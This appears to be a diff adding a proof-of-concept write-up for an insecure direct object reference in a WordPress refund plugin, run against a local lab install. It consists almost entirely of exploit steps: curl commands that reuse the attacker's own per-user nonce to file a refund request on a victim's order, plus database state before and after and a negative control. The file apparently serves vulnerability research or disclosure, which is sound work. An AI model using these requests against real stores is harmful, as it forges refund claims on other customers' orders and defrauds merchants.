@@ -1,0 +1,33 @@
+# FR-01 — IDOR: authenticated customer forges a refund request on another customer's order
+# Lab: WordPress 7.1.2 + WooCommerce 11.1.2 + Flexible Refund 2.0.3 (free). HPOS off.
+# Attacker = customer 'attacker' (uid 2), owns order 11. Victim = guest order 12 (billing victim@lab.test), NOT owned by attacker.
+
+## STEP 1 — attacker reads OWN order form and extracts the per-user nonce
+$ curl -b attacker.cookies 'http://localhost:8088/my-account/fr-refund/11/?form_id=1' | grep fr_refund_request
+  name="fr_refund_form[fr_refund_request]" value="4d56e5f988"   (nonce is per-USER, not per-order)
+
+## DB BEFORE
+  wp_fr_requests rows for victim order 12: 0
+  order 12 status: wc-completed
+
+## STEP 2 — attack request (attacker session, GET params target the VICTIM order+email)
+$ curl -b attacker.cookies \
+   'http://localhost:8088/?send_public_refund=1&refund_order_id=12&refund_email=victim@lab.test' \
+   --data 'fr_refund_form[items][2][qty]=1' \
+   --data 'fr_refund_form[form_id]=1' \
+   --data 'fr_refund_form[fr_refund_request]=4d56e5f988'
+
+## RESPONSE (headers)
+  HTTP/1.1 302 Found
+  Location: /?send_public_refund=1&refund_order_id=12&refund_email=victim%40lab.test&request=send
+
+## DB AFTER
+  wp_fr_requests for victim order 12:
+    id	order_id	status	request_type
+    12	12	requested	refund
+    
+  order 12 status: wc-refund-request   <-- changed to wc-refund-request
+
+## NEGATIVE CONTROL — wrong billing email is rejected (proves the hash_equals gate)
+$ curl ... refund_email=wrong@lab.test ...
+  HTTP 200 ; wp_fr_requests rows for order 12: 0  (no row created)
